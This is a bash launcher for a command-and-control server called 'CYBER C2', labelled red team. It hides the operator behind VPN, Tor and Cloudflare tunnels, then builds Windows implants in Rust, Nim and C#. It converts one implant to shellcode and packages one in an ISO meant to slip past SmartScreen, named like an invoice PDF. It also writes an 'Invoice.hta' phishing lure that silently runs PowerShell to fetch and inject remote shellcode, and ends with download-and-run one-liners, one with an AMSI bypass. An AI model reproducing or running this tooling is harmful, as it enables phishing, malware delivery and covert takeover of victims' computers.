#!/bin/bash
# CYBER C2 - Red Team Start Script
# Generates new tokens, compiles Rust agent, starts services
# Supports: VPN (manual) + Tor + Cloudflare layered OPSEC

RED="\033[0;31m"
GREEN="\033[0;32m"
YELLOW="\033[1;33m"
CYAN="\033[0;36m"
MAGENTA="\033[0;35m"
NC="\033[0m"

# Dynamic path detection - works on any system
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
C2_DIR="$SCRIPT_DIR"
LOG_DIR="$SCRIPT_DIR"

# Parse arguments
USE_TOR=false
RESUME_MODE=false
for arg in "$@"; do
    case $arg in
        --tor) USE_TOR=true ;;
        -t) USE_TOR=true ;;
        --resume) RESUME_MODE=true ;;
        -r) RESUME_MODE=true ;;
        --help|-h)
            echo -e "${CYAN}Usage: $0 [options]${NC}"
            echo -e "  ${GREEN}--tor, -t${NC}     Route through Tor network"
            echo -e "  ${GREEN}--resume, -r${NC}  Resume with existing tunnel URL (after crash)"
            echo -e "                 Keeps same Cloudflare URL, only restarts C2 server"
            echo -e "  ${GREEN}--help, -h${NC}    Show this help"
            exit 0
            ;;
    esac
done

echo -e "${CYAN}╔═══════════════════════════════════════════════════════════════╗${NC}"
echo -e "${CYAN}║           CYBER C2 - Red Team Start Script                    ║${NC}"
if $RESUME_MODE; then
echo -e "${CYAN}║           ${GREEN}🔄 RESUME MODE - KEEPING SAME TUNNEL${CYAN}                 ║${NC}"
fi
if $USE_TOR; then
echo -e "${CYAN}║           ${MAGENTA}🧅 TOR MODE ENABLED${CYAN}                                  ║${NC}"
fi
echo -e "${CYAN}╚═══════════════════════════════════════════════════════════════╝${NC}"

cd "$C2_DIR"

# [0/8] CHECK OPSEC LAYERS
echo -e "${YELLOW}[0/8] Checking OPSEC layers...${NC}"

# Check VPN (look for common VPN interfaces - works on macOS and Linux)
VPN_CONNECTED=false
if ip link 2>/dev/null | grep -qE "tun|tap|wg|nordlynx" || ifconfig 2>/dev/null | grep -qE "utun|tun|tap|ppp|nordlynx"; then
    VPN_IP=$(curl -s --max-time 5 https://api.ipify.org 2>/dev/null || echo "unknown")
    VPN_CONNECTED=true
    echo -e "${GREEN}  ✓ VPN detected (External IP: $VPN_IP)${NC}"
else
    echo -e "${YELLOW}  ⚠ No VPN detected - Connect NordVPN first for better OPSEC${NC}"
fi

# Check/Start Tor if requested
if $USE_TOR; then
    if ! command -v tor &>/dev/null; then
        echo -e "${RED}  ✗ Tor not installed. Install with: sudo apt install tor${NC}"
        echo -e "${YELLOW}  → Continuing without Tor...${NC}"
        USE_TOR=false
    else
        # Check if tor is running (cross-platform)
        if ! pgrep -x "tor" > /dev/null; then
            echo -e "${CYAN}  → Starting Tor service...${NC}"
            sudo systemctl start tor 2>/dev/null || brew services start tor 2>/dev/null || tor &
            sleep 5
        fi
        
        if pgrep -x "tor" > /dev/null; then
            # Verify Tor is working - wait for circuit to establish
            echo -e "${CYAN}  → Waiting for Tor circuit (up to 30s)...${NC}"
            TOR_IP=""
            for i in {1..6}; do
                TOR_IP=$(curl -s --socks5-hostname 127.0.0.1:9050 --max-time 10 https://check.torproject.org/api/ip 2>/dev/null | grep -oP '"IP":"\K[^"]+' || echo "")
                if [ -n "$TOR_IP" ]; then
                    break
                fi
                echo -e "${YELLOW}  ⚠ Circuit not ready, retry $i/6...${NC}"
                sleep 5
            done
            if [ -n "$TOR_IP" ]; then
                echo -e "${GREEN}  ✓ Tor running (Exit IP: $TOR_IP)${NC}"
            else
                echo -e "${RED}  ✗ Tor circuit failed after 30s${NC}"
                TOR_IP="failed"
            fi
        else
            echo -e "${RED}  ✗ Failed to start Tor${NC}"
            USE_TOR=false
        fi
    fi
fi

# Show OPSEC status
echo -e "${CYAN}  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${CYAN}  OPSEC Stack:${NC}"
echo -e "    ${GREEN}[1]${NC} Your Machine"
$VPN_CONNECTED && echo -e "    ${GREEN}[2]${NC} VPN (NordVPN)" || echo -e "    ${YELLOW}[2]${NC} VPN (not connected)"
$USE_TOR && echo -e "    ${GREEN}[3]${NC} Tor Network" || echo -e "    ${YELLOW}[3]${NC} Tor (disabled, use --tor)"
echo -e "    ${GREEN}[4]${NC} Cloudflare Edge"
echo -e "    ${GREEN}[5]${NC} Target"
echo -e "${CYAN}  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"

# [0b] First-run setup: create .env and generate keys if missing
if [ ! -f "$C2_DIR/.env" ]; then
    echo -e "${YELLOW}[0b] First run detected - creating .env from template...${NC}"
    if [ -f "$C2_DIR/.env.example" ]; then
        cp "$C2_DIR/.env.example" "$C2_DIR/.env"
    else
        touch "$C2_DIR/.env"
    fi
    # Generate JWT_SECRET
    JWT_SECRET=$(openssl rand -hex 64)
    echo "JWT_SECRET=$JWT_SECRET" >> "$C2_DIR/.env"
    echo -e "${GREEN}  ✓ Created .env with fresh JWT_SECRET${NC}"
fi

# Generate admin keypair if missing
if [ ! -f "$C2_DIR/admin.key" ]; then
    echo -e "${YELLOW}[0c] Generating admin RSA keypair...${NC}"
    if command -v python3 &>/dev/null && python3 -c "import cryptography" 2>/dev/null; then
        cd "$C2_DIR" && python3 generate_keys.py
        # Extract the public key and add to .env
        PUB_KEY=$(python3 -c "
from cryptography.hazmat.primitives import serialization
import base64
with open('admin.key.pub','rb') as f:
    pub = serialization.load_pem_public_key(f.read())
der = pub.public_bytes(serialization.Encoding.DER, serialization.PublicFormat.SubjectPublicKeyInfo)
print(base64.b64encode(der).decode())
")
        # Remove old key and add new one
        sedi "/^ADMIN_PUBLIC_KEY=/d" "$C2_DIR/.env"
        echo "ADMIN_PUBLIC_KEY=$PUB_KEY" >> "$C2_DIR/.env"
        echo -e "${GREEN}  ✓ admin.key generated - paste contents into login page${NC}"
        echo -e "${YELLOW}  ⚠ SAVE YOUR KEY: cat $C2_DIR/admin.key${NC}"
    else
        echo -e "${RED}  ✗ Cannot generate keys (need: pip install cryptography)${NC}"
        echo -e "${YELLOW}  → Run manually: python3 generate_keys.py${NC}"
    fi
fi

# Ensure JWT_SECRET exists in .env
if ! grep -q "^JWT_SECRET=" "$C2_DIR/.env" 2>/dev/null; then
    echo "JWT_SECRET=$(openssl rand -hex 64)" >> "$C2_DIR/.env"
    echo -e "${GREEN}  ✓ Generated JWT_SECRET${NC}"
fi

# [1/8] GENERATE NEW TOKENS (skip in resume mode)
if $RESUME_MODE; then
    echo -e "${YELLOW}[1/8] Resume mode - keeping existing tokens...${NC}"
    # Load existing tokens from .env
    source "$C2_DIR/.env" 2>/dev/null || true
    NEW_PAYLOAD_TOKEN="${PAYLOAD_TOKEN:-$(openssl rand -hex 16)}"
    NEW_API_KEY="${AGENT_API_KEY:-$(openssl rand -hex 16)}"
    NEW_A2A_SECRET="${A2A_JWT_SECRET:-$(openssl rand -hex 32)}"
    echo -e "${GREEN}  ✓ Using existing tokens from .env${NC}"
else
    echo -e "${YELLOW}[1/8] Generating new security tokens...${NC}"
    NEW_PAYLOAD_TOKEN=$(openssl rand -hex 16)
    NEW_API_KEY=$(openssl rand -hex 16)
    NEW_A2A_SECRET=$(openssl rand -hex 32)
fi

# Cross-platform sed function (macOS vs Linux)
sedi() {
    if [[ "$OSTYPE" == "darwin"* ]]; then
        sed -i '' "$@"
    else
        sed -i "$@"
    fi
}

# Update .env file
sedi "/^PAYLOAD_TOKEN=/d" "$C2_DIR/.env"
sedi "/^AGENT_API_KEY=/d" "$C2_DIR/.env"
sedi "/^A2A_JWT_SECRET=/d" "$C2_DIR/.env"
sedi "/^# Updated secrets/d" "$C2_DIR/.env"

echo "" >> "$C2_DIR/.env"
echo "# Updated secrets - $(date)" >> "$C2_DIR/.env"
echo "A2A_JWT_SECRET=$NEW_A2A_SECRET" >> "$C2_DIR/.env"
echo "AGENT_API_KEY=$NEW_API_KEY" >> "$C2_DIR/.env"
echo "PAYLOAD_TOKEN=$NEW_PAYLOAD_TOKEN" >> "$C2_DIR/.env"

PAYLOAD_TOKEN="$NEW_PAYLOAD_TOKEN"
AGENT_API_KEY="$NEW_API_KEY"

echo -e "${GREEN}  ✓ PAYLOAD_TOKEN: $PAYLOAD_TOKEN${NC}"
echo -e "${GREEN}  ✓ AGENT_API_KEY: $AGENT_API_KEY${NC}"

# Update bits.html with new token
sedi "s/'[a-f0-9]\{32\}'/'$NEW_PAYLOAD_TOKEN'/g" "$C2_DIR/static/bits.html"
echo -e "${GREEN}  ✓ Updated bits.html with new PAYLOAD_TOKEN${NC}"

# [2/8] Kill existing (keep tunnels in resume mode)
echo -e "${YELLOW}[2/8] Stopping existing processes...${NC}"
pkill -f "python main.py" 2>/dev/null || true
lsof -ti:8000 | xargs kill -9 2>/dev/null || true
if $RESUME_MODE; then
    echo -e "${GREEN}  ✓ Keeping Cloudflare tunnels alive${NC}"
    # Verify tunnels are still running (check both regular and torsocks)
    if pgrep -f "cloudflared" > /dev/null; then
        echo -e "${GREEN}  ✓ Tunnels still active (PID: $(pgrep -f cloudflared | head -1))${NC}"
    else
        echo -e "${RED}  ✗ Tunnels not running! Will create new ones...${NC}"
        RESUME_MODE=false
    fi
else
    pkill -f "cloudflared" 2>/dev/null || true
    echo -e "${GREEN}  ✓ Cleaned up (including tunnels)${NC}"
fi
sleep 2

# [3/8] Redis (macOS - uses brew services)
echo -e "${YELLOW}[3/8] Starting Redis...${NC}"
# systemctl is-active --quiet redis-server 2>/dev/null || systemctl start redis-server 2>/dev/null || redis-server --daemonize yes 2>/dev/null
brew services start redis 2>/dev/null || redis-server --daemonize yes 2>/dev/null
redis-cli ping &>/dev/null && echo -e "${GREEN}  ✓ Redis running${NC}" || echo -e "${YELLOW}  ⚠ Redis offline${NC}"

# [4/8] Skip MSF
echo -e "${YELLOW}[4/8] Skipping Metasploit RPC...${NC}"

# [5/8] C2 Server
echo -e "${YELLOW}[5/8] Starting C2 Server...${NC}"
mkdir -p "$C2_DIR/payloads"
source venv/bin/activate
PAYLOAD_TOKEN="$PAYLOAD_TOKEN" AGENT_API_KEY="$AGENT_API_KEY" USE_HTTPS=false MSF_SSL=false nohup python main.py > "$LOG_DIR/cyber_c2.log" 2>&1 &
C2_PID=$!
sleep 3
if ps -p $C2_PID > /dev/null 2>&1; then
    echo -e "${GREEN}  ✓ C2 Server running (PID: $C2_PID)${NC}"
else
    echo -e "${RED}  ✗ C2 Server failed!${NC}"
    tail -20 "$LOG_DIR/cyber_c2.log"
    exit 1
fi

# [6/8] Cloudflare Tunnel
if $RESUME_MODE; then
    echo -e "${YELLOW}[6/8] Resume mode - using existing Cloudflare Tunnel...${NC}"
    # Read existing tunnel URL from saved file
    TUNNEL_URL=""
    if [ -f "$C2_DIR/data/c2_tunnel_url.txt" ]; then
        TUNNEL_URL=$(cat "$C2_DIR/data/c2_tunnel_url.txt" 2>/dev/null | head -1)
    fi
    if [ -n "$TUNNEL_URL" ]; then
        echo -e "${GREEN}  ✓ C2 Tunnel (resumed): $TUNNEL_URL${NC}"
    else
        echo -e "${RED}  ✗ No saved tunnel URL found! Creating new tunnel...${NC}"
        RESUME_MODE=false
    fi
fi

if ! $RESUME_MODE; then
    echo -e "${YELLOW}[6/8] Starting Cloudflare Tunnel...${NC}"
    rm -f "$LOG_DIR/cloudflared.log" "$LOG_DIR/cloudflared_msf.log"

    # Retry up to 3 times if Cloudflare fails
    TUNNEL_URL=""
    for attempt in {1..3}; do
        [ $attempt -gt 1 ] && echo -e "${YELLOW}  → Retry $attempt/3...${NC}" && sleep 3
        
        # Tor mode: Use HTTPS_PROXY/HTTP_PROXY env vars (Go respects these)
        if $USE_TOR; then
            echo -e "${MAGENTA}  🧅 Routing tunnel through Tor SOCKS5...${NC}"
            HTTPS_PROXY=socks5://127.0.0.1:9050 HTTP_PROXY=socks5://127.0.0.1:9050 nohup cloudflared tunnel --protocol quic --url http://localhost:8000 > "$LOG_DIR/cloudflared.log" 2>&1 &
        else
            nohup cloudflared tunnel --url http://localhost:8000 > "$LOG_DIR/cloudflared.log" 2>&1 &
        fi
        CF_PID=$!
        for i in {1..40}; do  # Longer wait for Tor (40s)
            sleep 1
            TUNNEL_URL=$(grep -ao 'https://[a-z0-9-]*\.trycloudflare\.com' "$LOG_DIR/cloudflared.log" 2>/dev/null | head -1)
            [ -n "$TUNNEL_URL" ] && break
        done
        [ -n "$TUNNEL_URL" ] && break
        # Kill failed attempt and retry
        kill $CF_PID 2>/dev/null
    pkill -f "cloudflared tunnel" 2>/dev/null
    sleep 2
done
    [ -n "$TUNNEL_URL" ] && echo -e "${GREEN}  ✓ C2 Tunnel: $TUNNEL_URL${NC}" || echo -e "${RED}  ✗ No tunnel URL (check Tor/Cloudflare)${NC}"
    [ -n "$TUNNEL_URL" ] && echo "$TUNNEL_URL" > "$C2_DIR/data/c2_tunnel_url.txt"
fi

# [7/8] MSF Tunnel
# [7/8] MSF Tunnel
if $RESUME_MODE; then
    echo -e "${YELLOW}[7/8] Resume mode - using existing MSF Tunnel...${NC}"
    # Read existing MSF tunnel URL from saved file
    MSF_TUNNEL_URL=""
    if [ -f "$C2_DIR/data/msf_tunnel_url.txt" ]; then
        MSF_TUNNEL_URL=$(cat "$C2_DIR/data/msf_tunnel_url.txt" 2>/dev/null | head -1)
    fi
    if [ -n "$MSF_TUNNEL_URL" ]; then
        echo -e "${GREEN}  ✓ MSF Tunnel (resumed): $MSF_TUNNEL_URL${NC}"
    else
        echo -e "${YELLOW}  ⚠ No saved MSF tunnel URL (will skip MSF tunnel)${NC}"
    fi
else
    echo -e "${YELLOW}[7/8] Starting MSF Tunnel...${NC}"

    # If using Tor, get a new circuit to avoid rate limiting
    if $USE_TOR; then
        echo -e "${MAGENTA}  🧅 Requesting new Tor circuit...${NC}"
        # Request new circuit via control port
        (echo 'AUTHENTICATE ""'; echo 'SIGNAL NEWNYM'; echo 'QUIT') | nc localhost 9051 2>/dev/null || true
        sleep 5  # Wait for new circuit
    fi

    # Retry MSF tunnel with retries
    MSF_TUNNEL_URL=""
    for attempt in {1..3}; do
        [ $attempt -gt 1 ] && echo -e "${YELLOW}  → Retry $attempt/3...${NC}" && sleep 5
        
        if $USE_TOR; then
            HTTPS_PROXY=socks5://127.0.0.1:9050 HTTP_PROXY=socks5://127.0.0.1:9050 nohup cloudflared tunnel --protocol quic --url https://localhost:8443 --no-tls-verify > "$LOG_DIR/cloudflared_msf.log" 2>&1 &
        else
            nohup cloudflared tunnel --url https://localhost:8443 --no-tls-verify > "$LOG_DIR/cloudflared_msf.log" 2>&1 &
        fi
        MSF_PID=$!
        for i in {1..40}; do  # 40s wait for Tor
            sleep 1
            MSF_TUNNEL_URL=$(grep -ao 'https://[a-z0-9-]*\.trycloudflare\.com' "$LOG_DIR/cloudflared_msf.log" 2>/dev/null | head -1)
            [ -n "$MSF_TUNNEL_URL" ] && break
        done
        [ -n "$MSF_TUNNEL_URL" ] && break
        kill $MSF_PID 2>/dev/null
        # Request new circuit for retry
        if $USE_TOR; then
            (echo 'AUTHENTICATE ""'; echo 'SIGNAL NEWNYM'; echo 'QUIT') | nc localhost 9051 2>/dev/null || true
            sleep 3
        fi
    done
    [ -n "$MSF_TUNNEL_URL" ] && echo -e "${GREEN}  ✓ MSF Tunnel: $MSF_TUNNEL_URL${NC}" || echo -e "${RED}  ✗ No MSF tunnel (Tor may be rate limited)${NC}"
    [ -n "$MSF_TUNNEL_URL" ] && echo "$MSF_TUNNEL_URL" > "$C2_DIR/data/msf_tunnel_url.txt"
fi

# Generate shellcode.txt if MSF tunnel is available
# [8/8] COMPILE RUST AGENT (EXE + DLL)
if [ -n "$TUNNEL_URL" ]; then
    echo -e "${YELLOW}[8/8] Compiling Rust Agents (EXE + DLL)...${NC}"
    RUST_DIR="$C2_DIR/payloads/rust_agent_v3"
    P="$C2_DIR/payloads"

    # Source Rust environment first
    source ~/.cargo/env 2>/dev/null

    if [ -d "$RUST_DIR" ] && command -v cargo &>/dev/null; then
        # Update BOTH agent.rs and lib.rs with plain text constants
        for FILE in "$RUST_DIR/src/agent.rs" "$RUST_DIR/src/lib.rs"; do
            # Replace const values with new URLs/tokens
            sedi "s|const C2_URL: &str = \"https://[^\"]*\";|const C2_URL: \&str = \"$TUNNEL_URL\";|g" "$FILE"
            sedi "s|const API_KEY: &str = \"[^\"]*\";|const API_KEY: \&str = \"$AGENT_API_KEY\";|g" "$FILE"
            sedi "s|const PAYLOAD_TOKEN: &str = \"[^\"]*\";|const PAYLOAD_TOKEN: \&str = \"$PAYLOAD_TOKEN\";|g" "$FILE"
        done
        echo -e "${CYAN}  → Updated agent with new C2 URL${NC}"

        # Compile
        cd "$RUST_DIR"
        echo -e "${CYAN}  → Building EXE + DLL (~45s)...${NC}"
        # Force rebuild by touching source files
        touch src/agent.rs src/lib.rs
        if RUSTFLAGS="-C link-arg=-s" cargo build --release --target x86_64-pc-windows-gnu 2>&1 | grep -v "warning:" | grep -E "(Compiling agent|Finished|error)"; then
            # Copy to payloads folder
            cp "$RUST_DIR/target/x86_64-pc-windows-gnu/release/agent.exe" "$P/agent.exe"
            cp "$RUST_DIR/target/x86_64-pc-windows-gnu/release/agent.dll" "$P/agent.dll"
            [ -f "$P/agent.exe" ] && echo -e "${GREEN}  ✓ agent.exe ($(du -h "$P/agent.exe" | cut -f1))${NC}"
            [ -f "$P/agent.dll" ] && echo -e "${GREEN}  ✓ agent.dll ($(du -h "$P/agent.dll" | cut -f1))${NC}"
        else
            echo -e "${RED}  ✗ Compile FAILED${NC}"
        fi
        cd "$C2_DIR"
    fi
    
    # [8b] COMPILE NIM AGENT (EXE + DLL) - Using WinHTTP (native Windows SSL, no OpenSSL needed!)
    echo -e "${YELLOW}[8b] Compiling Nim Agents (agent_nim.exe + agent_nim.dll)...${NC}"
    NIM_DIR="$C2_DIR/payloads/nim_agent"
    
    if [ -d "$NIM_DIR" ] && command -v nim &>/dev/null; then
        # Update Nim WinHTTP source with new URLs/tokens (works with HTTPS natively!)
        for FILE in "$NIM_DIR/agent_winhttp.nim" "$NIM_DIR/agent_dll_winhttp.nim"; do
            if [ -f "$FILE" ]; then
                sedi "s|const C2_URL = \"https://[^\"]*\"|const C2_URL = \"$TUNNEL_URL\"|g" "$FILE"
                sedi "s|const API_KEY = \"[a-f0-9]*\"|const API_KEY = \"$AGENT_API_KEY\"|g" "$FILE"
                sedi "s|const TOKEN = \"[a-f0-9]*\"|const TOKEN = \"$PAYLOAD_TOKEN\"|g" "$FILE"
            fi
        done
        echo -e "${CYAN}  → Updated Nim agent with new C2 URL (WinHTTP)${NC}"
        
        cd "$NIM_DIR"
        
        # Compile EXE (WinHTTP - no SSL DLLs needed!)
        echo -e "${CYAN}  → Building Nim EXE (WinHTTP)...${NC}"
        nim c -d:release -d:strip --opt:size --app:gui -d:mingw --cpu:amd64 -o:agent_nim.exe agent_winhttp.nim 2>&1 | grep -E "(Hint:|Error:|success)" || true
        [ -f "agent_nim.exe" ] && cp agent_nim.exe "$P/agent_nim.exe" && echo -e "${GREEN}  ✓ agent_nim.exe ($(du -h "$P/agent_nim.exe" | cut -f1))${NC}"
        
        # Compile DLL (WinHTTP)
        echo -e "${CYAN}  → Building Nim DLL (WinHTTP)...${NC}"
        nim c -d:release -d:strip --opt:size --app:lib -d:mingw --cpu:amd64 -o:agent_nim.dll --nomain agent_dll_winhttp.nim 2>&1 | grep -E "(Hint:|Error:|success)" || true
        [ -f "agent_nim.dll" ] && cp agent_nim.dll "$P/agent_nim.dll" && echo -e "${GREEN}  ✓ agent_nim.dll ($(du -h "$P/agent_nim.dll" | cut -f1))${NC}"
        
        cd "$C2_DIR"
    else
        echo -e "${YELLOW}  ⚠ Nim not installed or nim_agent folder missing${NC}"
    fi

    # [8c] DONUT SHELLCODE GENERATION (from Nim EXE)
    echo -e "${YELLOW}[8c] Generating Donut shellcode from Nim EXE...${NC}"
    if [ -f "$P/agent_nim.exe" ]; then
        # Use Python donut-shellcode package
        python3 -c "
import donut
import base64
import sys

try:
    # Generate shellcode from Nim EXE
    # -a 2 = x64, -b 1 = no AMSI/WLDP bypass (we do it manually), -e 3 = random names
    shellcode = donut.create(file='$P/agent_nim.exe', arch=2, bypass=1, entropy=3)
    
    if shellcode:
        # Save raw shellcode
        with open('$P/shellcode_nim.bin', 'wb') as f:
            f.write(shellcode)
        
        # Save base64 encoded
        b64 = base64.b64encode(shellcode).decode()
        with open('$P/shellcode.txt', 'w') as f:
            f.write(b64)
        
        print(f'OK:{len(shellcode)}:{len(b64)}')
    else:
        print('FAIL:no_shellcode')
        sys.exit(1)
except Exception as e:
    print(f'FAIL:{e}')
    sys.exit(1)
" 2>&1 | while read line; do
            if [[ "$line" == OK:* ]]; then
                RAW_SIZE=$(echo "$line" | cut -d: -f2)
                B64_SIZE=$(echo "$line" | cut -d: -f3)
                echo -e "${GREEN}  ✓ shellcode.txt (${RAW_SIZE} bytes raw, ${B64_SIZE} chars b64)${NC}"
                echo -e "${GREEN}  ✓ shellcode_nim.bin (raw binary)${NC}"
            elif [[ "$line" == FAIL:* ]]; then
                echo -e "${RED}  ✗ Donut failed: ${line#FAIL:}${NC}"
            fi
        done
    else
        echo -e "${YELLOW}  ⚠ agent_nim.exe not found, skipping shellcode generation${NC}"
    fi

    # [8d] COMPILE C# AGENT (.NET 8 - 11MB self-contained)
    echo -e "${YELLOW}[8d] Compiling C# Agent (.NET 8)...${NC}"
    CS_DIR="$C2_DIR/payloads/cs_agent/Agent"
    
    if [ -d "$CS_DIR" ] && command -v dotnet &>/dev/null; then
        # Update C# source from template with new URLs/tokens
        if [ -f "$CS_DIR/Program.cs.template" ]; then
            cp "$CS_DIR/Program.cs.template" "$CS_DIR/Program.cs"
            sedi "s|%%C2_URL%%|$TUNNEL_URL|g" "$CS_DIR/Program.cs"
            sedi "s|%%API_KEY%%|$AGENT_API_KEY|g" "$CS_DIR/Program.cs"
            sedi "s|%%PAYLOAD_TOKEN%%|$PAYLOAD_TOKEN|g" "$CS_DIR/Program.cs"
            echo -e "${CYAN}  → Updated C# agent with new C2 URL${NC}"
        else
            echo -e "${RED}  ✗ Program.cs.template not found!${NC}"
        fi
        
        cd "$CS_DIR"
        echo -e "${CYAN}  → Building C# EXE (self-contained ~11MB)...${NC}"
        if dotnet publish -c Release -r win-x64 --self-contained true -p:PublishSingleFile=true -p:PublishTrimmed=true -o out 2>&1 | grep -E "(Agent ->|error|warning CS)" | head -5; then
            [ -f "out/Agent.exe" ] && cp out/Agent.exe "$P/agent_cs.exe"
            [ -f "$P/agent_cs.exe" ] && echo -e "${GREEN}  ✓ agent_cs.exe ($(du -h "$P/agent_cs.exe" | cut -f1))${NC}"
            
            # Generate ISO for MOTW bypass (No SmartScreen!)
            if [ -f "$C2_DIR/tools/iso_generator_v2.py" ] && [ -f "$P/agent_cs.exe" ]; then
                echo -e "${CYAN}  → Generating ISO payload (MOTW bypass)...${NC}"
                cd "$C2_DIR"
                python3 tools/iso_generator_v2.py "$P/agent_cs.exe" -o "$P/payload.iso" -n "Invoice_Q4_2025.pdf" -t pdf 2>/dev/null
                [ -f "$P/payload.iso" ] && echo -e "${GREEN}  ✓ payload.iso ($(du -h "$P/payload.iso" | cut -f1)) - NO SMARTSCREEN!${NC}"
            fi
        else
            echo -e "${RED}  ✗ C# compile FAILED${NC}"
        fi
        cd "$C2_DIR"
    else
        echo -e "${YELLOW}  ⚠ .NET SDK not installed or cs_agent folder missing${NC}"
    fi

    
    # Update PowerShell payloads (cross-platform) - URL and API KEY
    if [ -f "$P/enhanced_agent_fastapi.ps1" ]; then
        sedi "s|\\\$C2_URL = \"https://[^\"]*\"|\\\$C2_URL = \"$TUNNEL_URL\"|g" "$P/enhanced_agent_fastapi.ps1"
        sedi "s|\\\$SecretKey = \"[a-f0-9]*\"|\\\$SecretKey = \"$AGENT_API_KEY\"|g" "$P/enhanced_agent_fastapi.ps1"
        echo -e "${GREEN}  ✓ Updated enhanced_agent_fastapi.ps1 (URL + API_KEY)${NC}"
    fi
    
    # Update SYSCALL injection payloads with shellcode URL
    SHELLCODE_URL="$TUNNEL_URL/payloads/shellcode.txt?key=$PAYLOAD_TOKEN"
    for SYSCALL_FILE in "$P/inject.ps1" "$P/i5_syscall.ps1" "$P/i5_syscall_update.ps1"; do
        if [ -f "$SYSCALL_FILE" ]; then
            sedi "s|\\\$u=\"https://[^\"]*\"|\\\$u=\"$SHELLCODE_URL\"|g" "$SYSCALL_FILE"
            sedi "s|\\\$u='https://[^']*'|\\\$u='$SHELLCODE_URL'|g" "$SYSCALL_FILE"
        fi
    done
    echo -e "${GREEN}  ✓ Updated syscall payloads (inject.ps1, i5_syscall*.ps1)${NC}"
    
    # Generate HTA payload (runs i5_syscall.ps1 for in-memory shellcode injection)
    SYSCALL_URL="$TUNNEL_URL/payloads/i5_syscall.ps1?key=$PAYLOAD_TOKEN"
    cat > "$P/Invoice.hta" << HTAEOF
<html>
<head>
<title>Document Viewer</title>
<HTA:APPLICATION ID="doc" APPLICATIONNAME="Document" BORDER="thin" SHOWINTASKBAR="yes" SINGLEINSTANCE="yes" SYSMENU="yes" WINDOWSTATE="normal"/>
</head>
<body style="font-family:Segoe UI;background:#f0f0f0;margin:0;padding:40px;text-align:center">
<div style="background:#fff;padding:30px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,0.1);max-width:350px;margin:auto">
<div style="font-size:40px">📄</div>
<h2 style="color:#333;margin:10px 0">Loading Document...</h2>
<p style="color:#666;font-size:13px">Please wait while the document viewer initializes.</p>
<div style="background:#e0e0e0;height:4px;border-radius:2px;margin:20px 0"><div id="bar" style="background:#0078d4;height:100%;width:0%;border-radius:2px"></div></div>
<p id="msg" style="color:#888;font-size:11px">Connecting...</p>
</div>
<script language="VBScript">
Sub Window_OnLoad
    window.resizeTo 400, 300
    window.moveTo (screen.width-400)/2, (screen.height-300)/2
    document.getElementById("bar").style.width = "100%"
    setTimeout "RunIt", 2000
End Sub

Sub RunIt
    On Error Resume Next
    document.getElementById("msg").innerText = "Opening document..."
    Dim c
    Set c = CreateObject("WScript.Shell")
    c.Run "powershell -w hidden -ep bypass -c ""IEX(IWR '$SYSCALL_URL' -UseBasicParsing)""", 0, False
    setTimeout "self.close", 1500
End Sub
</script>
</body>
</html>
HTAEOF
    echo -e "${GREEN}  ✓ Created Invoice.hta (→ i5_syscall.ps1 → shellcode injection)${NC}"
fi

# SUMMARY
echo ""
echo -e "${CYAN}╔═══════════════════════════════════════════════════════════════╗${NC}"
echo -e "${CYAN}║                  CYBER C2 - OPERATIONAL                       ║${NC}"
echo -e "${CYAN}╠═══════════════════════════════════════════════════════════════╣${NC}"
echo -e "${CYAN}║${NC}  ${GREEN}🌐 C2:${NC} $TUNNEL_URL"
echo -e "${CYAN}║${NC}  ${GREEN}🎯 MSF:${NC} $MSF_TUNNEL_URL"
echo -e "${CYAN}║${NC}  ${YELLOW}🔑 TOKEN:${NC} $PAYLOAD_TOKEN"
echo -e "${CYAN}║${NC}  ${YELLOW}🔑 API_KEY:${NC} $AGENT_API_KEY"
echo -e "${CYAN}╠═══════════════════════════════════════════════════════════════╣${NC}"
echo -e "${CYAN}║${NC}  ${MAGENTA}🛡️ OPSEC:${NC}"
$VPN_CONNECTED && echo -e "${CYAN}║${NC}    ${GREEN}✓${NC} VPN Connected (IP: $VPN_IP)" || echo -e "${CYAN}║${NC}    ${YELLOW}⚠${NC} VPN Not Detected"
$USE_TOR && echo -e "${CYAN}║${NC}    ${GREEN}✓${NC} Tor Enabled (Exit: $TOR_IP)" || echo -e "${CYAN}║${NC}    ${YELLOW}○${NC} Tor Disabled (use --tor)"
echo -e "${CYAN}╚═══════════════════════════════════════════════════════════════╝${NC}"
echo ""
echo -e "${RED}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${YELLOW}▶ RUST AGENT EXE (Invisible):${NC}"
echo -e "${CYAN}\$d=\$env:LOCALAPPDATA+'\\Temp\\svc.exe';IWR '$TUNNEL_URL/payloads/rust_agent.exe?key=$PAYLOAD_TOKEN' -OutFile \$d;Start-Process \$d -WindowStyle Hidden${NC}"
echo ""
echo -e "${YELLOW}▶ RUST AGENT DLL (rundll32/regsvr32):${NC}"
echo -e "${CYAN}\$d=\$env:LOCALAPPDATA+'\\Temp\\svc.dll';IWR '$TUNNEL_URL/payloads/rust_agent.dll?key=$PAYLOAD_TOKEN' -OutFile \$d;rundll32.exe \$d,Start${NC}"
echo ""
echo -e "${YELLOW}▶ BITS AGENT (PowerShell):${NC}"
echo -e "${CYAN}powershell -nop -ep bypass -w hidden -c \"IEX((New-Object Net.WebClient).DownloadString('$TUNNEL_URL/payloads/enhanced_agent_fastapi.ps1?key=$PAYLOAD_TOKEN'))\"${NC}"
echo ""
echo -e "${YELLOW}▶ SYSCALL INJECT (i5_syscall.ps1 - NT API):${NC}"
echo -e "${CYAN}IEX(IWR '$TUNNEL_URL/payloads/i5_syscall.ps1?key=$PAYLOAD_TOKEN' -UseBasicParsing)${NC}"
echo ""
echo -e "${YELLOW}▶ SYSCALL INJECT + AMSI BYPASS (i5_syscall_update.ps1):${NC}"
echo -e "${CYAN}IEX(IWR '$TUNNEL_URL/payloads/i5_syscall_update.ps1?key=$PAYLOAD_TOKEN' -UseBasicParsing)${NC}"
echo ""
echo -e "${YELLOW}▶ SIMPLE INJECT (inject.ps1):${NC}"
echo -e "${CYAN}IEX(IWR '$TUNNEL_URL/payloads/inject.ps1?key=$PAYLOAD_TOKEN' -UseBasicParsing)${NC}"
echo ""
echo -e "${YELLOW}▶ NIM AGENT EXE (Smaller, AV Evasive):${NC}"
